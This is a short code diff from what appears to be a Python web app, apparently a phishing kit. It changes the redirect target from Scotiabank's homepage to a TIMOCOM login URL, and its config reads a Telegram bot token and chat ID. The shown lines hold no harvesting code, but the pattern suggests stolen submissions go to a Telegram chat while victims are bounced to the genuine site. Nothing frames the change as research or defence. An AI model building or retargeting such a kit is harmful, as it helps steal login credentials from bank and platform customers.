@@ -27,7 +27,7 @@ limiter = Limiter(
 )
 
 # ---------- Config ----------
-REDIRECT_URL       = "https://www.scotiabank.com/"
+REDIRECT_URL       = "https://iam.timocom.com/realms/timocom/protocol/openid-connect/auth?client_id=web-ui-public-login&redirect_uri=https%3A%2F%2Fmy.timocom.com%2Fapp%2Ftcgate%2F%3F__hstc%3D236178206.257e7153810ba9223d03d03b349a9087.1790770911152.1790770911152.1790770911152.1%26__hssc%3D236178206.1.1790770911152%26__hsfp%3D9bf97e88f32f2ebf4914e9b82f2ca481&state=3d9a60ec-b78e-4514-a25f-cdbf484b66d1&response_mode=fragment&response_type=code&scope=openid&nonce=4dfb47ac-1285-424d-9da3-6855917eba5c&code_challenge=yde2We0Ei1WLhE1ye1ok9iKeKmNSCR4HcpN4u9LMhPo&code_challenge_method=S256"
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
 
